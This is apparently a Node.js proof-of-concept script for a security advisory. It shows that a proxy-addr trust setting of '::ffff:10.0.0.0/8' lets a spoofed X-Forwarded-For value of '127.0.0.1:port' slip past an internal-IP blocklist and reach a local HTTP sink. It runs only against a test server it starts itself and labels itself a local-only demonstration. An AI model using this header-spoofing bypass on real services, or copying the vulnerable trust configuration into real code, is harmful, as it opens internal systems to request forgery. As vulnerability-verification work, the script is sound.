import assert from 'node:assert/strict'
import http from 'node:http'
import proxyaddr from 'proxy-addr'
import ipRangeCheck from 'ip-range-check'

const blockedRanges = ['127.0.0.0/8', '10.0.0.0/8', '169.254.0.0/16']
const sinkMarker = 'ALEXANDRIA_LOCAL_SINK_MARKER'

const listen = (server, host) => new Promise((resolve) => {
  server.listen(0, host, () => resolve(server.address().port))
})

const close = server => new Promise((resolve, reject) => server.close(error => error ? reject(error) : resolve()))

const requestLocal = url => new Promise((resolve, reject) => {
  http.get(url, response => {
    let body = ''
    response.setEncoding('utf8')
    response.on('data', chunk => { body += chunk })
    response.on('end', () => resolve({ status: response.statusCode, body }))
  }).on('error', reject)
})

const sink = http.createServer((_req, res) => {
  res.writeHead(200, { 'content-type': 'text/plain' })
  res.end(sinkMarker)
})

const port = await listen(sink, '127.0.0.1')
const rawHeaderValue = `127.0.0.1:${port}`
const syntheticRequest = {
  headers: { 'x-forwarded-for': rawHeaderValue },
  socket: { remoteAddress: '198.51.100.10' },
  connection: { remoteAddress: '198.51.100.10' }
}

try {
  const safeControls = [
    ['10.0.0.0/8'],
    ['::ffff:10.0.0.0/104']
  ].map(ranges => ({ ranges, client: proxyaddr(syntheticRequest, proxyaddr.compile(ranges)) }))
  assert.deepEqual(safeControls.map(control => control.client), ['198.51.100.10', '198.51.100.10'])

  // This is the vulnerable proxy-addr trust-subnet shape from the advisory.
  const trust = proxyaddr.compile(['::ffff:10.0.0.0/8'])
  const rawClient = proxyaddr(syntheticRequest, trust)
  const validatorDecision = ipRangeCheck(rawClient, blockedRanges)
  const normalizedTarget = new URL(`http://${rawClient}`)

  assert.equal(rawClient, rawHeaderValue)
  assert.equal(validatorDecision, false)
  assert.equal(normalizedTarget.hostname, '127.0.0.1')
  assert.equal(normalizedTarget.port, String(port))

  const response = await requestLocal(normalizedTarget)
  assert.equal(response.status, 200)
  assert.equal(response.body, sinkMarker)

  console.log(JSON.stringify({
    peer: syntheticRequest.socket.remoteAddress,
    rawHeaderValue,
    rawClient,
    validatorDecision,
    normalizedTarget: normalizedTarget.href,
    localSinkReached: response.body === sinkMarker,
    safeControls,
    note: 'Local-only differential demonstration; not evidence that Alexandria has this sink.'
  }, null, 2))
} finally {
  await close(sink)
}
